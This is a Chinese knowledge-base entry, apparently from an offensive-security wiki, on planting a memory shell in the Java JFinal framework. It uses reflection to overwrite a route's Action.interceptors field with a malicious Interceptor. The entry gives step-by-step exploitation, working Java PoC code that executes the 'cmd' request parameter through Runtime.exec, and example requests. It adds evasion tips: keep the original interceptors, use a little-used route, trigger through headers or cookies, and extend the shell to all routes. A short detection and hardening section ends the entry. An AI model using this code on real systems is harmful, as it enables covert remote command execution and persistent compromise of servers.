---
id: web-java-framework-jfinal-action-interceptors-field-memshell
title: JFinal 既有 Action 的 interceptors 字段替换：给指定路由（如 /hello）挂恶意 Interceptor，只有该路径带 cmd 参数才执行
type: scenario
domain: web
path: web/java/framework
technique: jfinal-action-interceptors-field-replace-memshell
tags:
- java
- jfinal
- memshell
- interceptor
- aop
- reflection
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:42:22+08:00'
  notes: 已对照原文与图09/10/11/12/13/14核对：ActionHandler.handle 88 行 → Invocation.invoke 遍历 interceptors（图09/10/11）、/addinterceptormemshell 回显 interceptormemshell added（图13）、/hello?cmd=calc 弹计算器（图14，卡内引用的原页面文案为 this is a hello 与图12 一致）均与原文 AddInterceptormemshell.index 的 getDeclaredField(interceptors)+field.set 一致。未验证点：未复跑 PoC；字段名与 Invocation 内实现按原文断点截图整理；JFinal 版本未标注。
url: /docs/web/java/framework/web-java-framework-jfinal-action-interceptors-field-memshell/
draft: false
kb_aliases:
- JFinal Interceptor 内存马
- Action.interceptors 反射替换
- Invocation.invoke 拦截器链
- 指定路由内存马
- /hello?cmd=calc
---

## 一句话结论

JFinal 的 `ActionHandler` 在执行 Controller 方法前会 `new Invocation(action, controller).invoke()`，而 `Invocation.invoke()` 遍历的是 `action.getInterceptors()` 数组；这个 `interceptors` 是 `Action` 的普通字段（构造时赋值、无 final 保护），因此只要反射把目标路由对应 `Action` 的 `interceptors` 换成恶意 `Interceptor`，该路由的每次请求都会先经过攻击者代码——可按 `cmd` 参数触发命令执行，且只影响选定路径。

## 原理

- **拦截器是运行时字段而非注册表**：`Action` 持有 `Interceptor[] interceptors`；`ActionHandler` 在 `Invocation.invoke()` 里 `if (this.index < this.inters.length) { this.inters[this.index++].intercept(this); }`，因此改数组即改行为，不需要动 `Routes` 或 `Interceptors` 配置。
- **Invocation 保证链式推进**：`Interceptor.intercept(Invocation)` 内部通常调 `invocation.invoke()` 继续下一个；恶意拦截器只要在调 `invoke()` 前做自己的事（读 `invocation.getController().getPara("cmd")` 执行命令），就不会打断正常业务（`/hello` 仍返回原内容）。
- **为什么选既有路由**：新增路由要造 `Action`（还要处理 `ParaProcessorBuilder`、`viewPath` 等），改既有 `Action` 只需一个 `Field.set`，代价最小；选一个业务上不常用但已知的路径（原文选 `/hello`）可降低被发现概率。
- **拿到 Action 的路径**：`JFinalFilter → jfinal → actionMapping → mapping`，`mapping.get("/hello")` 即该路由的 `Action`；`interceptors` 字段声明在 `Action` 类上，`getDeclaredField("interceptors")` + `setAccessible(true)` 可直接 `set` 成新数组。
- **与 Handler 内存马的区别**：Handler 在所有请求最外层（`next` 链），影响面大但容易被统一日志发现；Interceptor 只对特定 action 生效，按参数条件触发，隐蔽性更好。

## 触发条件

- 目标为 JFinal，classpath 有 `com.jfinal.aop.Interceptor`、`Invocation`、`com.jfinal.core.Action`。
- 攻击者能在 JVM 内执行 Java 代码且位于请求线程（拿到 `JFinalFilter`/`ActionMapping`）。
- 已知目标路由（如 `/hello`）在 `mapping` 中存在；`interceptors` 字段未被改为 final 或不可变数组。
- 反射可 `setAccessible`（应用类字段在 JDK 9+ 下通常无需 `--add-opens`）。

## 利用步骤

1. 取 `ActionMapping.mapping`，`mapping.get("/hello")` 拿到目标 `Action`。
2. 反射 `Action.class.getDeclaredField("interceptors")`，`setAccessible(true)`。
3. 构造恶意 `Interceptor`（`intercept` 里取 `invocation.getController().getPara("cmd")`，非空则 `Runtime.exec`，最后 `invocation.invoke()`）。
4. `field.set(action, new Interceptor[]{ shellInterceptor })`，替换原数组（原数组中的业务拦截器会失效，若需保留可前后拼接）。
5. 请求 `/hello?cmd=calc` 验证命令执行，同时 `/hello` 无参数时仍返回原内容（证明未破坏业务）。
6. 需要更隐蔽时把触发条件改成特定 header/cookie，而不是 `cmd` 参数。

## PoC

```java
public class ShellInterceptor implements Interceptor {
    @Override
    public void intercept(Invocation invocation) {
        Controller controller = invocation.getController();
        if (controller.getPara("cmd") != null) {
            try {
                Runtime.getRuntime().exec(controller.getPara("cmd"));
            } catch (IOException e) { e.printStackTrace(); }
        }
        invocation.invoke();   // 继续原链路，保持业务正常
    }
}

// 注入
Action helloAction = (Action) mapping.get("/hello");
Field field = helloAction.getClass().getDeclaredField("interceptors");
field.setAccessible(true);
field.set(helloAction, new Interceptor[]{ new ShellInterceptor() });
renderText("interceptormemshell added");
```

```text
GET /addinterceptormemshell        → "interceptormemshell added"
GET /hello?cmd=calc                → 弹计算器，同时页面仍输出 "this is a hello"
```

## 变体与关联

- 变体：保留原拦截器再追加（`new Interceptor[]{ orig..., shell }`），避免业务行为变化被察觉；或只在 `Interceptor` 内做内存马二次注入（把自身挂到更多 action 上）。
- 变体：把拦截器挂到所有 action（遍历 `mapping.values()` 逐个 `set`），等价于全局内存马但比改 Handler 更隐蔽。
- 关联：[[web-java-framework-jfinal-actionmapping-route-memshell]]（改 `mapping` 新增路由的姊妹手法）、[[web-java-framework-jfinal-handler-next-chain-memshell]]（改 `Handler.next` 的全局手法）、[[web-java-framework-undertow-managedfilter-threadlocal-lifecycle-locate]]（取 `JFinalFilter`/`ActionMapping` 的入口）、[[web-java-framework-spring-mvc-interceptor-memshell]]（Spring MVC 同类拦截器内存马）。
- 边界：目标路由不存在、`interceptors` 被改成不可变/复制语义、JDK 强封装、非 JFinal 容器时失败；重启后失效。

## 检测与防御

- 检测：`Invocation.invoke` 的调用栈中出现不在已部署类集合的 `Interceptor` 实现；`Action.interceptors` 数组长度/元素在运行期变化；同一路由带可疑参数（`cmd`）时响应时间/行为异常；RASP 挂钩 `Interceptor.intercept` 记录实现类来源。
- 加固：升级 JFinal，把 `Action.interceptors` 改为不可变或在 `ActionHandler` 中校验拦截器来源；JDK 17+ 保持强封装；根因仍是阻断任意代码执行的写入入口。
- 应急：遍历 `mapping`，对每个 `Action` 检查 `interceptors` 的元素类是否来自原始 jar（类加载器 + CodeSource），异常即清除；同时检查 Handler 链。
